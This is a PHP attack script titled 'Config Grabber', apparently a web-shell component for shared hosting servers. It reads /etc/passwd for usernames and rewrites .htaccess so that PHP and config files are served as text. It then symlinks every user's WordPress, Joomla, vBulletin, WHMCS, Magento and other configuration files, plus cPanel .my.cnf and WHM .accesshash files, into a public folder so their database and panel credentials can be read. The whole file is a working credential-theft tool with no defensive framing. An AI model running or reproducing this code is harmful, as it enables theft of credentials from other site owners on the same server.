<?php
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0); 
@ini_set('file_uploads',1);
echo '<table class="directory-listing-table"><thead><td><center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">'; 
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); echo $str[0]."\n"; } 
echo'</textarea><br><input type="hidden" class="input" name="folfig" value="d7netcfg" size=40 />
<select class="inp"  title="Select Your TypeFile"  name="type" size=""><option>--- select ---</option><option title="type txt" value=".txt">.txt</option><option title="type php" value=".php">.php</option><option title="type shtml" value=".shtml">.shtml</option><option title="type ini" value=".ini">.ini</option><option title="type html" value=".html">.html</option></select><br><br>
<input name="conf" size="80" class="ipt" value="GASS!" type="submit">
</td></thead></table></form></center><br>';
 if($_POST['conf']) {
$folfig = $_POST['folfig']; $type = $_POST['type'];
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess="
Options Indexes FollowSymLinks
\nDirectoryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .accesshash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]);
foreach($passwd as $pwd){ $user=trim($pwd);
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Phpbb2.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress1.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress2.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla2.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla3.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home/'.$user.'/public_html/conf_global.php',$user.'-invisio.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home/'.$user.'/public_html/connect.php',$user.'-8.txt');
@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'-mk-portale1.txt');
@symlink('/home/'.$user.'/public_html/include/config.php',$user.'-12.txt');
@symlink('/home/'.$user.'/public_html/settings.php',$user.'-Smf.txt');
@symlink('/home/'.$user.'/public_html/includes/functions.php',$user.'-phpbb3.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-infinity.txt');
@symlink('/home1/'.$user.'/.my.cnf',$user.'-cpanel.txt');
@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
@symlink('/home/'.$user.'/public_html/slconfig.php',$user.'-sitelok.txt');
@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-elislab.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangentot.txt');
@symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'-lokmed.txt');
@symlink('/home/'.$user.'/public_html/po-library/po-config.php',$user.'-popojembut.txt');
@symlink('/home/'.$user.'/public_html/lokomedia/config/koneksi.php',$user.'-lokmed.txt');
echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
}
}
?>